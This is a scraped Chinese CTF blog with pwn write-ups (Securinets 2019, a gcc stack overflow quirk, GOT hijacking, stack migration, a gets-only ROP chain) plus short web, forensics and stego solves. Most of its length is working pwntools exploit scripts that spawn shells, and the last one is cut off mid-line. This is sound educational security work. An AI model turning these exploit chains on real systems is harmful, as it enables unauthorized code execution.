&apos;/Users/qianfei/Desktop/baby1&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida反编译出main函数： 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-30h] setvbuf(_bss_start, 0LL, 2, 0LL); write(1, \"Welcome to securinets Quals!\\n\", 0x1DuLL); return read(0, &amp;buf, 0x12CuLL);&#125; 简单的rop，利用__libc_csu_init来call函数，达到泄漏和getshell。Exploit： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./baby1')else: p = remote('51.254.114.246', 1111)elf = ELF('./baby1')read_plt = elf.plt['read']write_plt = elf.plt['write']read_got = elf.got['read']write_got = elf.got['write']main = elf.symbols['main']# gdb.attach(p)buf = 0x0602000-0x100# 4006a0: 4c 89 ea mov rdx,r13# 4006a3: 4c 89 f6 mov rsi,r14# 4006a6: 44 89 ff mov edi,r15d# 4006a9: 41 ff 14 dc call QWORD PTR [r12+rbx*8]# 4006ad: 48 83 c3 01 add rbx,0x1# 4006b1: 48 39 eb cmp rbx,rbp# 4006b4: 75 ea jne 4006a0 &lt;__libc_csu_init+0x40&gt;# 4006b6: 48 83 c4 08 add rsp,0x8# 4006ba: 5b pop rbx# 4006bb: 5d pop rbp# 4006bc: 41 5c pop r12# 4006be: 41 5d pop r13# 4006c0: 41 5e pop r14# 4006c2: 41 5f pop r15# 4006c4: c3 retdef csu(rbx, rbp, r12, r13, r14, r15, addr): payload = '\\x00' * 56 + p64(0x4006ba) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(0x4006a0) + '\\x00' * 56 + p64(addr) p.sendline(payload)# payload = cyclic(500)offset = 56csu(0, 1, write_got, 8, write_got, 1, main)write = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00'))success('write = ' + hex(write))write_offset = 0x0f72b0libc_base = write - write_offsetsuccess('libc_base = ' + hex(libc_base))execve = libc_base + 0x0000000000cc770system = libc_base + 0x045390str_bin_sh = libc_base + 0x18cd57csu(0, 1, read_got, 16, buf, 0, main)p.send(p64(execve) + '/bin/sh\\x00')csu(0, 1, buf, 0, 0, buf + 8, main)p.interactive() Simple1234567root@91120f278fdd:~/ctf/2019-Securinets/pwn/Simple# checksec ./simple [*] '/root/ctf/2019-Securinets/pwn/Simple/simple' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ida反编译main函数： 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-50h] unsigned __int64 v5; // [rsp+48h] [rbp-8h] v5 = __readfsqword(0x28u); setvbuf(_bss_start, 0LL, 2, 0LL); read(0, &amp;buf, 0x3FuLL); printf(&amp;buf, &amp;buf); perror(\"hemm okay\\n\"); return __readfsqword(0x28u) ^ v5;&#125; 在printf处可以看到格式化字符串漏洞，基本上这道题目就是多次利用了这个漏洞。第一次我们通过格式化字符串泄漏出libc的地址等相关信息，同时将perror的got表改成main。第二次把one_gadget填到ret的地址上。第三次把perror的got表改回去，然后程序会直接ret到one_gadget。Exploit： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./simple') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') one_gadget_offset = 0x4f322else: p = remote('51.254.114.246', 4444) libc = ELF('libc.so.6') one_gadget_offset = 0x4526aelf = ELF('./simple')main = elf.symbols['main']perror_got = elf.got['perror']read_got = elf.got['read']payload = '%14$p%10$s%1682c%9$hn'payload += '\\x00' * (24 - len(payload))payload += p64(perror_got)payload += p64(read_got)p.send(payload)leak = p.recv()offset = 0xd8ret = int(leak[0:14], 16) - offsetread = u64(leak[14:20].ljust(8, '\\x00'))success('read = ' + hex(read))libc_base = read - libc.symbols['read']success('libc_base = ' + hex(libc_base))one_gadget = libc_base + one_gadget_offseta0 = one_gadget &amp; 0xffffa1 = ((one_gadget &amp; 0xffff0000) &gt;&gt; 16)a1 = (a1 - a0 - 1) % 0x10000 + 1payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(a0, 10)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(a1, 11)payload += '\\x00' * (32 - len(payload))payload += p64(ret)payload += p64(ret + 2)p.sendline(payload)payload = '%1430c%8$hn'payload += '\\x00' * (16 - len(payload))payload += p64(perror_got)p.sendline(payload)p.interactive() Baby Two1234567$ checksec ./baby2 [*] '/Users/qianfei/ctf/ctf/2019-Securinets/pwn/Baby-Two/baby2' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida反编译main函数： 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+8h] [ebp-30h] setvbuf(_bss_start, 0, 2, 0); return read(0, &amp;buf, 0x12Cu);&#125; WebFeedback这是一道XXE_Processing)，我们通过burpsuite抓包，然后直接利用网上的exp看到： 然后同理，看到有simple_user这个用户，我们尝试看看能不能在家目录拿到flag： 发现没有，再试试apche根目录： 还是不行。发现网站是nginx搭的，就google一下nginx的默认www目录： 然后我们可以看到root的路径，尝试获得flag： ForenEasy Trade用wireshark打开给的pcap包，总共只有几十条信息，可以一条条看下来。首先可以看到给出的key： 然后再往下看可以找到一个PK头的zip，看得到里面有flag.txt： 拿到flag.txt的内容后base64解密一下拿到flag： 12345678910$ cat data securinetsXD$ unzip flag.zip Archive: flag.zip[flag.zip] flag.txt password: extracting: flag.txt $ cat flag.txt | base64 -Dsecurinets&#123;954f670cb291ec276b1a9ff8453ea60% MiscHIDDEN题目提示了在url栏中有些不一样的地方。可以看到这个网站用了http而不是https： 点开后在证书中看到flag： EZ图片隐写，在线解密一下： 123456789101112131415161718192021222324252627--START--&quot;The fact is that upon his entrance I had instantly recognized the extremepersonal danger in which I lay. The only conceivable escape for him lay in silencingmy tongue. In an instant I had slipped the revolver from the drawer into mypocket and was covering him through the cloth. At his remark I drew the weaponout and laid it cocked upon the table. He still smiled and blinked, but there wassomething about his eyes which made me feel very glad that I had it there,&quot;You evidently don&apos;t know me,&apos; said he.&quot;&apos;On the contrary,&apos; I answered, &apos;I think it is fairly evident that I do. Pray takea chair. I can spare you five minutes if you have anything to say.&apos;&quot;&apos;All that I have to say has already crossed your mind,&apos; said he.&quot;&apos;Then possibly my answer has crossed yours,&apos; I replied.&quot;&apos;You stand fast?&apos;&quot;&apos;Absolutely.&apos;&quot;He clapped his hand into his pocket, and I raised the pistol from the table.But he merely drew out a &lt;DETELED_WORD&gt; in which he had scribbled somedates.&quot;You crossed my path on the fourth of January,&apos; said he. &apos;On the twenty-thirdyou incommoded me; by the middle of February I was seriously inconveniencedby you; at the end of March I was absolutely hampered in my plans; and now, atthe close of April, I find myself placed in such a position through your continualpersecution that I am in positive danger of losing my liberty. The situation isbecoming an impossible one.&apos;&quot;&apos;Have you any suggestion to make?&apos; I asked.&quot;&apos;You must drop it, Mr. Holmes,&apos; said he, swaying his face about. &apos;You reallymust, you know.&apos;&quot;--END--; 可以看到有一个单词被删掉了，根据题目提示我们需要找到这个单词。google之后发现是福尔摩斯的一个片段，找到单词之后，在线sha1哈希一下得到flag。 Referencehttp://dann.com.br/alexctf2k17-crypto100-many_time_secrets/https://www.youtube.com/watch?v=r23Yk2lutJ0&amp;feature=youtu.behttps://ptr-yudai.hatenablog.com/entry/2019/03/25/152043https://www.rootnetsec.com/securinets-prequals-automateme/https://ctftime.org/writeup/14075","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"}]},{"title":"Buffer Overflow with gcc>=4.9","slug":"Buffer-Overflow-with-gcc-4-9","date":"2019-03-17T09:43:52.000Z","updated":"2019-03-18T12:57:46.111Z","comments":true,"path":"2019/03/17/Buffer-Overflow-with-gcc-4-9/","link":"","permalink":"https://qianfei11.github.io/2019/03/17/Buffer-Overflow-with-gcc-4-9/","excerpt":"gcc的版本如果大于4.9，main函数下的缓冲区溢出会有不一样的check，即使没开canary，也不能溢出。","text":"gcc的版本如果大于4.9，main函数下的缓冲区溢出会有不一样的check，即使没开canary，也不能溢出。 Source自己写的一道题目，源码： 1234567891011121314// gcc p3.c -o p3 -m32 -static -fno-stack-protector -g#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main() &#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); char buf[200]; printf(\"say something: \"); gets(buf); return 0;&#125; Analysis乍一看是静态编译，然后又是gets，一定是很容易的栈溢出，但是大于4.9版本的gcc是不太一样的。main函数中是这样的： 1234567891011121314150804887c &lt;main&gt;: 804887c: 8d 4c 24 04 lea ecx,[esp+0x4] 8048880: 83 e4 f0 and esp,0xfffffff0 8048883: ff 71 fc push DWORD PTR [ecx-0x4] 8048886: 55 push ebp 8048887: 89 e5 mov ebp,esp 8048889: 51 push ecx 804888a: 81 ec d4 00 00 00 sub esp,0xd4 ...... 80488eb: 83 c4 10 add esp,0x10 80488ee: b8 00 00 00 00 mov eax,0x0 80488f3: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 80488f6: c9 leave 80488f7: 8d 61 fc lea esp,[ecx-0x4] 80488fa: c3 ret 这里我们可以看到，程序在对栈的保存上，额外使用了ecx来保存栈上的某个值。当我们尝试栈溢出的时候，会覆盖到ecx上，导致最后恢复的栈值不存在。通过gdb调试我们可以看得更清楚： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────EAX: 0x804887c (&lt;main&gt;: lea ecx,[esp+0x4])EBX: 0x80481a8 (&lt;_init&gt;: push ebx)ECX: 0xffffcd90 --&gt; 0x1 EDX: 0xffffcdb4 --&gt; 0x80481a8 (&lt;_init&gt;: push ebx)ESI: 0x80ea00c --&gt; 0x8067020 (&lt;__strcpy_sse2&gt;: mov edx,DWORD PTR [esp+0x4])EDI: 0x0 EBP: 0xffffcd78 --&gt; 0x0 ESP: 0xffffcc94 --&gt; 0x2c0003f EIP: 0x8048893 (&lt;main+23&gt;: push 0x80bb288)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)───────────────────────────────────────────────────────────────────── Code ──────────────────────────────────────────────────────────────────── 0x8048889 &lt;main+13&gt;: push ecx 0x804888a &lt;main+14&gt;: sub esp,0xd4 0x8048890 &lt;main+20&gt;: sub esp,0xc=&gt; 0x8048893 &lt;main+23&gt;: push 0x80bb288 0x8048898 &lt;main+28&gt;: call 0x804ed60 &lt;printf&gt; 0x804889d &lt;main+33&gt;: add esp,0x10 0x80488a0 &lt;main+36&gt;: sub esp,0xc 0x80488a3 &lt;main+39&gt;: lea eax,[ebp-0xd0]──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────0000| 0xffffcc94 --&gt; 0x2c0003f 0004| 0xffffcc98 --&gt; 0xfff 0008| 0xffffcc9c --&gt; 0x0 0012| 0xffffcca0 --&gt; 0x0 0016| 0xffffcca4 --&gt; 0x5b (&apos;[&apos;)0020| 0xffffcca8 --&gt; 0x0 0024| 0xffffccac --&gt; 0xf0b5ff 0028| 0xffffccb0 --&gt; 0xffffccee --&gt; 0xe6ce0000 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Legend: code, data, rodata, heap, value0x08048893 7 printf(&quot;say something: &quot;);assassinq&gt;&gt; p $ecx$1 = 0xffffcd90......────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────EAX: 0x0 EBX: 0x80481a8 (&lt;_init&gt;: push ebx)ECX: 0x42424242 (&apos;BBBB&apos;)EDX: 0x80eb4e0 --&gt; 0x0 ESI: 0x80ea00c --&gt; 0x8067020 (&lt;__strcpy_sse2&gt;: mov edx,DWORD PTR [esp+0x4])EDI: 0x0 EBP: 0xffffcd78 --&gt; 0x0 ESP: 0xffffcca0 --&gt; 0x0 EIP: 0x80488ba (&lt;main+62&gt;: leave)EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)───────────────────────────────────────────────────────────────────── Code ──────────────────────────────────────────────────────────────────── 0x80488af &lt;main+51&gt;: add esp,0x10 0x80488b2 &lt;main+54&gt;: mov eax,0x0 0x80488b7 &lt;main+59&gt;: mov ecx,DWORD PTR [ebp-0x4]=&gt; 0x80488ba &lt;main+62&gt;: leave 0x80488bb &lt;main+63&gt;: lea esp,[ecx-0x4] 0x80488be &lt;main+66&gt;: ret 0x80488bf: nop 0x80488c0 &lt;generic_start_main&gt;: push esi──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────0000| 0xffffcca0 --&gt; 0x0 0004| 0xffffcca4 --&gt; 0x5b (&apos;[&apos;)0008| 0xffffcca8 (&apos;A&apos; &lt;repeats 200 times&gt;...)0012| 0xffffccac (&apos;A&apos; &lt;repeats 200 times&gt;...)0016| 0xffffccb0 (&apos;A&apos; &lt;repeats 196 times&gt;, &quot;BBBB&quot;)0020| 0xffffccb4 (&apos;A&apos; &lt;repeats 192 times&gt;, &quot;BBBB&quot;)0024| 0xffffccb8 (&apos;A&apos; &lt;repeats 188 times&gt;, &quot;BBBB&quot;)0028| 0xffffccbc (&apos;A&apos; &lt;repeats 184 times&gt;, &quot;BBBB&quot;)───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Legend: code, data, rodata, heap, value0x080488ba 10 &#125;assassinq&gt;&gt; p $ecx$2 = 0x42424242 显然ecx的作用是使得esp恢复到原来的值，那么如果我们破坏了esp，那么会造成奇怪的影响。既然ecx无法覆盖，那么我们就需要想办法绕过它。在上面调试的过程中，我们发现ecx的最低两个字节是0x90，如果我们把它改成00，那么我们的栈就会往下掉0x90个字节，我们输入的buf就能有用武之地。由于这里输入使用的是gets，采用的是0x00截断我们的输入，我们可以充分利用这个特点，达到我们的目的。 这个程序是静态编译的，可以使用ret2syscall。我们把rop填在buf的最后面，前面则填满一个ret的gadget，这样的话只要ecx保存的地址低两位大于我们rop的长度，就有概率成功打通。 Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env pythonfrom pwn import *context.arch = 'i386'local = 1if local: p = process('./p3')else: p = remote('10.21.13.69', 10016)elf = ELF('./p3')g = lambda x: next(elf.search(asm(x)))ret = g('ret')info('ret = ' + hex(ret))pop_eax_ret = g('pop eax ; ret')pop_ebx_ret = g('pop ebx ; ret')pop_ecx_ret = g('pop ecx ; ret')pop_edx_ret = g('pop edx ; ret')int_0x80_ret = g('int 0x80 ; ret') buf = 0x080eb000 - 100# gdb.attach(p)offset = 204# read(0, '/bin/sh\\x00', 100)rop1 = [ pop_eax_ret, 3, pop_ebx_ret, 0, pop_ecx_ret, buf, pop_edx_ret, 100, int_0x80_ret, ]# execve('/bin/sh\\x00', 0, 0)rop2 = [ pop_eax_ret, 0xb, pop_ebx_ret, buf, pop_ecx_ret, 0, pop_edx_ret, 0, int_0x80_ret]rop = ''.join(map(p32, rop1 + rop2))info('len(rop) = ' + str(len(rop)))offset2 = offset - len(rop)info('offset2 = ' + str(offset2))payload = p32(ret) * (offset2 / 4) + ropinfo('len(payload) = ' + str(len(payload)))# payload = cyclic(500)p.sendline(payload)p.sendline('/bin/sh\\x00')p.interactive() Reference【ctf-pwn】【winesap】STCS 2016 Week4","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"Got Hijacking and Stack Migration","slug":"Got-Hijacking-and-Stack-Migration","date":"2019-03-16T03:49:16.000Z","updated":"2019-03-19T06:25:45.399Z","comments":true,"path":"2019/03/16/Got-Hijacking-and-Stack-Migration/","link":"","permalink":"https://qianfei11.github.io/2019/03/16/Got-Hijacking-and-Stack-Migration/","excerpt":"记录两道题目，关于Got Hijacking和Stack Migration。","text":"记录两道题目，关于Got Hijacking和Stack Migration。 Got Hijacking一般在有格式化字符串漏洞的地方或者heap的漏洞利用中经常用到，通过修改某个常规函数的got表达到奇怪的目的。 Source1234567891011121314151617// gcc main.c -o main#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;void A()&#123; setvbuf(stdout,0,_IONBF,0); srand(time(0)^getpid()); char buf[100]; int magic = rand(); gets(buf); if(atoi(buf)==magic)&#123; puts(\"OKay...\"); &#125;&#125;int main()&#123; A();&#125; Analysis想法是直接把puts的got盖成system，总共送两次payload。 Exploit1234567891011121314151617181920212223242526272829#!/usr/bin/env pythonfrom pwn import *# context.log_level='debug'context.terminal = ['tmux', 'sp', '-h']context.arch = 'amd64'p = process('./main')elf = ELF('./main')libc = ELF('./libc.so')g = lambda x: next(elf.search(asm(x)))A = elf.symbols['A']gets_plt = elf.plt['gets']puts_plt = elf.plt['puts']puts_got = elf.got['puts']puts_offset = libc.symbols['puts']system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))pop_rdi_ret = g('pop rdi ; ret')# gdb.attach(p)offset = 136payload = 'A' * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(A)p.sendline(payload)libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - puts_offsetsuccess('libc_base = ' + hex(libc_base))system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetpayload = 'A' * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(gets_plt) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(puts_plt)p.sendline(payload)p.sendline(p64(system))p.interactive() Stack Migration栈迁移（Stack Migration）是在可以输入的ROP链长度不够时，可以扩展输入的方法。 核心概念是将ROP链分别写在指定区域，然后再把栈迁移过去执行。 其中为了保持栈帧平衡最重要的一条指令是leave ; ret，32位下等价于mov esp, ebp ; pop ebp。 Source1234567891011121314// gcc main.c -o main -fno-stack-protector -Wl,-z,relro,-z,now#include&lt;stdio.h&gt;void vul()&#123; char buf[0x20]; memset(buf,0,0x20); read(0,buf,0x30); puts(buf);&#125;int main()&#123; vul(); return 0;&#125; 源码中buf为0x20个字节，但只让读0x30个字节，也就是说我们只能修改ebp和ret的地址。 Analysisobjdump反汇编一下vul函数： 12345678910111213141516171819202100000000004006a6 &lt;vul&gt;: 4006a6: 55 push rbp 4006a7: 48 89 e5 mov rbp,rsp 4006aa: 48 83 ec 20 sub rsp,0x20 4006ae: 48 8d 45 e0 lea rax,[rbp-0x20] 4006b2: ba 20 00 00 00 mov edx,0x20 4006b7: be 00 00 00 00 mov esi,0x0 4006bc: 48 89 c7 mov rdi,rax 4006bf: e8 c4 fe ff ff call 400588 &lt;_init+0x40&gt; ; memset 4006c4: 48 8d 45 e0 lea rax,[rbp-0x20] 4006c8: ba 30 00 00 00 mov edx,0x30 4006cd: 48 89 c6 mov rsi,rax 4006d0: bf 00 00 00 00 mov edi,0x0 4006d5: b8 00 00 00 00 mov eax,0x0 4006da: e8 b1 fe ff ff call 400590 &lt;_init+0x48&gt; ; read 4006df: 48 8d 45 e0 lea rax,[rbp-0x20] 4006e3: 48 89 c7 mov rdi,rax 4006e6: e8 95 fe ff ff call 400580 &lt;_init+0x38&gt; ; puts 4006eb: 90 nop 4006ec: c9 leave 4006ed: c3 ret 看到read其实是往rbp-0x20的地方读东西。那么可以想到在第一次payload的时候改掉ebp，然后ret到read这个地方，于是第二次就可以读一段rop到我们设置的buf上。然后跳过去。最后一次再跳回到A，然后往buf上写&quot;system(&quot;/bin/sh&quot;)&quot;，再把栈搬过去就能getshell。 Exploit1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'amd64'local = 0if local: p = process('./main')else: p = remote('10.21.13.69', 10015)elf = ELF('./main')libc = ELF('./libc.so')g = lambda x: next(elf.search(asm(x)))leave_ret = g('leave ; ret') # 0x00000000004005ecpop_rdi_ret = g('pop rdi ; ret') # 0x0000000000400673sub_rsp_0x20 = g('sub rsp, 0x20') # 0x4005aaread_plt = elf.plt['read'] # 0x400490read_got = elf.got['read'] # 0x600fe8puts_plt = elf.plt['puts'] # 0x400480buf = 0x00602000 - 0x100vul = elf.symbols['vul'] # 0x4005a6gadget1 = 0x4006c4read_offset = libc.symbols['read']system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))# p.send(p64(0xdeadbeef).ljust(0x20,'\\x00'))# gdb.attach(p)payload = 'A' * 32 + p64(buf) + p64(gadget1)p.send(payload) # edit rbppayload = p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vul) + p64(buf - 0x20 - 8) + p64(leave_ret)p.send(payload)read = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) libc_base = read - read_offsetsuccess('libc_base = ' + hex(libc_base))system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetpayload = (p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)).ljust(32, '\\x00') + p64(buf - 0x28 - 8) + p64(leave_ret)p.send(payload)p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"Gets一把梭","slug":"Gets一把梭","date":"2019-03-07T04:50:23.000Z","updated":"2019-03-27T09:35:40.862Z","comments":true,"path":"2019/03/07/Gets一把梭/","link":"","permalink":"https://qianfei11.github.io/2019/03/07/Gets一把梭/","excerpt":"如果程序只有一个gets()。","text":"如果程序只有一个gets()。 Checksecchecksec： 123456[*] &apos;/home/assassinq/pwn/r3t/GETS/gets&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Main Function只有一个main函数，就给了一个gets()： 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-10h] gets(&amp;v4, argv, envp); return 0;&#125; Solution这道题的思路主要是泄漏出gets的真实地址，然后利用给出的libc计算出gets与system之间的offset得到system的地址，最后读入sh，执行system拿到shell。 Gadgets先放上会用到的gadgets： 1234567891011g = lambda x: next(elf.search(asm(x)))pop_rsp_r13_r14_r15_ret = g('pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret')pop_rbp_ret = g('pop rbp ; ret')pop_rdi_ret = g('pop rdi ; ret')pop_r15_ret = g('pop r15 ; ret')pop_rsi_r15_ret = g('pop rsi ; pop r15 ; ret')pop_rbp_r14_r15_ret = g('pop rbp ; pop r14 ; pop r15 ; ret')pop_rbx_rbp_r12_r13_r14_r15_ret = g('pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret')add_ebx_esi_ret = g('add ebx, esi ; ret')leave_ret = g('leave ; ret')call_at_r12 = g('call QWORD PTR [r12+rbx*8]') Buf因为操作很多，我们需要通过栈迁移来达到目的，所以使用了很多bss段上的空间： 123456789bss = 0x602000buf1 = bss - 0x100buf2 = bss - 0x200buf3 = bss - 0x300buf4 = bss - 0x400buf5 = bss - 0x500buf6 = bss - 0x600buf7 = bss - 0x700buf8 = bss - 0x800 Analyse第一个rop将所有的buf用gets读上来。并且最后通过leave ; ret跳到buf1上： 12345678910rop1 = [ pop_rdi_ret, buf1, gets_plt, # rop2 pop_rdi_ret, buf2, gets_plt, # rop4 pop_rdi_ret, buf3, gets_plt, # rop5 pop_rdi_ret, buf4, gets_plt, # rop7 pop_rdi_ret, buf5, gets_plt, # rop9 pop_rdi_ret, buf6, gets_plt, # rop10 pop_rdi_ret, buf7, gets_plt, # rop13 pop_rbp_ret, buf1 - 8, leave_ret] 第二个rop为我们读入buf1的内容。先看看这里gets的got表处的情况： 12345678910111213141516.got.plt:0000000000601020 off_601020 dq offset gets ; DATA XREF: _gets↑r.got.plt:0000000000601020 _got_plt ends.got.plt:0000000000601020.data:0000000000601028 ; ===========================================================================.data:0000000000601028.data:0000000000601028 ; Segment type: Pure data.data:0000000000601028 ; Segment permissions: Read/Write.data:0000000000601028 ; Segment alignment &apos;qword&apos; can not be represented in assembly.data:0000000000601028 _data segment para public &apos;DATA&apos; use64.data:0000000000601028 assume cs:_data.data:0000000000601028 ;org 601028h.data:0000000000601028 public __data_start ; weak.data:0000000000601028 __data_start db 0 ; Alternative name is &apos;__data_start&apos;.data:0000000000601028 ; data_start.data:0000000000601029 db 0.data:000000000060102A db 0 got表在这里是只读的，但在后面的data段是可写的。我们可以先在gets地址后面24byte的地方填上leave ; ret，然后为跳转到buf2提前设好rbp。最后利用pop_rsp_r13_r14_r15_ret把gets的地址放到r13上。前面可以。同时接上第三个rop送上去的leave_ret： 123456789rop2 = [ # buf1 pop_rdi_ret, gets_got + 24, gets_plt, # rop3 pop_rbp_ret, buf2 - 8, pop_rsp_r13_r14_r15_ret, gets_got]rop3 = [ # gets_got + 24 leave_ret] 然后接下来需要用到__libc_csu_init()这个函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344.text:0000000000400550 ; void _libc_csu_init(void).text:0000000000400550 public __libc_csu_init.text:0000000000400550 __libc_csu_init proc near ; DATA XREF: _start+16↑o.text:0000000000400550 ; __unwind &#123;.text:0000000000400550 push r15.text:0000000000400552 push r14.text:0000000000400554 mov r15d, edi.text:0000000000400557 push r13.text:0000000000400559 push r12.text:000000000040055B lea r12, __frame_dummy_init_array_entry.text:0000000000400562 push rbp.text:0000000000400563 lea rbp, __do_global_dtors_aux_fini_array_entry.text:000000000040056A push rbx.text:000000000040056B mov r14, rsi.text:000000000040056E mov r13, rdx.text:0000000000400571 sub rbp, r12.text:0000000000400574 sub rsp, 8.text:0000000000400578 sar rbp, 3.text:000000000040057C call _init_proc.text:0000000000400581 test rbp, rbp.text:0000000000400584 jz short loc_4005A6.text:0000000000400586 xor ebx, ebx.text:0000000000400588 nop dword ptr [rax+rax+00000000h].text:0000000000400590.text:0000000000400590 loc_400590: ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400590 mov rdx, r13.text:0000000000400593 mov rsi, r14.text:0000000000400596 mov edi, r15d.text:0000000000400599 call qword ptr [r12+rbx*8].text:000000000040059D add rbx, 1.text:00000000004005A1 cmp rbx, rbp.text:00000000004005A4 jnz short loc_400590.text:00000000004005A6.text:00000000004005A6 loc_4005A6: ; CODE XREF: __libc_csu_init+34↑j.text:00000000004005A6 add rsp, 8.text:00000000004005AA pop rbx.text:00000000004005AB pop rbp.text:00000000004005AC pop r12.text:00000000004005AE pop r13.text:00000000004005B0 pop r14.text:00000000004005B2 pop r15.text:00000000004005B4 retn.text:00000000004005B4 ; &#125; // starts at 400550.text:00000000004005B4 __libc_csu_init endp 实际上__libc_csu_init()没有做任何事情，无论我们调用多少次都是一样的。我们先通过第四个rop把它写到buf2上，后面再解释需要做什么： 1234rop4 = [ # buf2 libc_csu_init, pop_rbp_ret, buf3 - 8, leave_ret] 第五个rop往buf2-24和buf2+32的地方写东西，之后再跳上去。因为之前gets的地址已经被pop到了r13上，然后走一次__libc_csu_init()会push到栈上，这个时候也就是buf2，之后接上一个pop rbx就能给rbx。然后为了得到system的地址，我们需要用add_ebx_esi_ret把两者加起来。加完之后再把ebx放回栈上，也就是buf2： 12345678910111213141516rop5 = [ # buf3 pop_rdi_ret, buf2 - 24, gets_plt, # rop6_1 pop_rdi_ret, buf2 + 32, gets_plt, # rop6_2 pop_rbp_ret, buf2 - 24 - 8, leave_ret]rop6_1 = [ # buf2 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop6_2 = [ # buf2 + 32 pop_rsi_r15_ret, offset, 8, add_ebx_esi_ret, libc_csu_init, pop_rbp_ret, buf4 - 8, leave_ret] 加完之后发现只留了地址的低四位，高四位被弄丢了。我们需要做的就是把所有的offset加上4，这样同样的做法我们就能拿到高四位的值。因为栈其实是不需要对齐的，所以这样做是可以的。这样的话之后的操作大部分细节和之前是一样的，后面就不用加offset了。然后需要计算一下之前的低四位在栈上的什么地方，计算好位置之后读上去： 12345678910111213141516171819202122232425262728293031323334rop7 = [ # buf4 pop_rdi_ret, gets_got + 28, gets_plt, # rop8 pop_rbp_ret, buf5 - 8, pop_rsp_r13_r14_r15_ret, gets_got + 4]rop8 = [ # gets_got + 28 leave_ret]rop9 = [ # buf5 libc_csu_init, pop_rbp_ret, buf6 - 8, leave_ret]rop10 = [ # buf6 pop_rdi_ret, buf5 - 24, gets_plt, # rop11_1 pop_rdi_ret, buf5 + 32, gets_plt, # rop11_2 pop_rbp_ret, buf5 - 24 - 8, leave_ret]rop11_1 = [ # buf5 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop11_2 = [ # buf5 + 32 pop_rdi_ret, buf2 + 68, gets_plt, # rop12 pop_rbp_ret, buf2 + 68 - 8, leave_ret]rop12 = [ # buf2 + 164 libc_csu_init, pop_rbp_ret, buf7 - 8, leave_ret] 最后system的地址已经在栈上了，读一下参数，利用__libc_csu_init()调用一下就行了： 123456rop13 = [ pop_rdi_ret, buf8, gets_plt, # shell command pop_rdi_ret, buf8, pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2 + 24, 0, 0, 0, call_at_r12] Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 